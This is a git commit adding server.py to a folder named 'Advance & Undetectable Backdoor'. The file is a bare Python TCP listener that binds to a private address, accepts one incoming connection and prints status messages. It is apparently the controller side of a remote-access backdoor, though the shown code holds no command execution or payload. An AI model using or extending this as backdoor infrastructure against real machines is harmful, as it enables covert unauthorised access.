5fbb8ec77e32a5a443a5d23516ac4cb68bb77b90
Kaushik Kumar <infernosec29@gmail.com>
2024-12-25 23:13:51 +0530

    Add files via upload

---
+++ Advance & Undetectable  Backdoor/server.py
@@ -0,0 +1,21 @@
+import socket
+from termcolor import colored
+
+# Create a socket object
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+
+# Bind the socket to the specified address and port
+s.bind(("192.168.29.186", 12345))
+s.listen(5)
+
+print(colored("[+] Listening for Incoming Connections", "green"))
+
+# Accept a connection
+target, ip = s.accept()  # Corrected this line
+
+print(colored("[+] Connection Established From: %s" % str(ip), "green"))
+
+# Optionally, you can close the socket after use
+# target.close()
+# s.close()
